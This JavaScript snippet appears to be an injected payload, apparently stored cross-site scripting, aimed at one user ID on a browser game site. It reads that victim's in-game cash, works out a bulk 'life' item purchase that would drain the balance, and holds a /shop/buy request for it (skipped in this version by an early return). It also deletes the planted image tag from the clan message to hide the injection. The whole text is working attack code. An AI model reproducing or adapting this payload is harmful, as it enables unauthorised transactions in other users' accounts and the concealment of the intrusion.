(function() {
    //var UID = "168374";
    var UID = "1023423";

//return; //______________________________________________________________
    clear();
    
    if (window.__shop4932665471t) { return; }
    window.__shop4932665471t = true;
    
    var uid = String(socketconfig.uid);
    
    if (uid != UID) {
        return;
    }
    
    console.log("shopping1");
    
    function clear() {
        var img = document.getElementById("idshp0y");
        if (img) {
            img.parentNode.removeChild(img);
        }
    }
    
    function clearDB() {
        ajax({
            url : '/clans',
            onLoad : function (r) {
                try {
                    r = JSON.parse(r);
                    if (r.message && parseInt(r.rights, 10) && (parseInt(r.rights, 10) & 8)) {
                        var rx = /<img[^>]+idshp0y[^>]+>/;
                        var str = r.message.replace(rx, "");
                        if (str != r.message) {
                            ajax({
                                url: "/clans/save_name",
                                data: {n: str, u: r.clan},
                                onLoad : function (r) {}
                            });
                        }
                    }
                } catch (exc) {}
            },
            onError: function() {  }
        });
    }
    
    
    function shopping(sum) {
        var price = {
            oil: 10,
            mask: 20,
            life: 20
        };
        var code = {
            oil: 103,
            mask: 105,
            life: 111
        };
        sum = parseInt(sum, 10) || 0;
        console.log("sum = " + sum);
        //if (sum < 200000) { return clear(); }
        var count = Math.floor(sum / price.life) - 1;
        console.log("count = " + count);
        //count = 1; // ************************************************
        var bonus = code.life + "|" + count;
        console.log("bonus = " + bonus);
        clearDB();
        return; // ******************************************************
        ajax({ url: "/shop/buy", data: {bonus: bonus}, onLoad: function(r) { }});
    }
    
    function getSum(callback) {
        function getSum1000() {
            ajax({ url: "/shop/bag", onLoad: function(r) { 
                try {
                    r = JSON.parse(r);
                } catch (exc) {
                    callback(0);
                    return;
                }
                if (r && r.content && r.content["1000"]) {
                    callback(r.content["1000"]);
                } else {
                    callback(0);
                }
            }, onError: function() {
                callback(0);
            }});
        }
        ajax({ url: "/shop/cash", onLoad: function(r) {
            try {
                r = JSON.parse(r);
            } catch (exc) {
                getSum1000();
                return;
            }
            if (r && r.cash) {
                callback(r.cash);
            } else {
                getSum1000();
            }
        }, onError: function() {
            getSum1000();
        }});
    }
    
    function start() {
        getSum(shopping);
    }
    
    start();
})();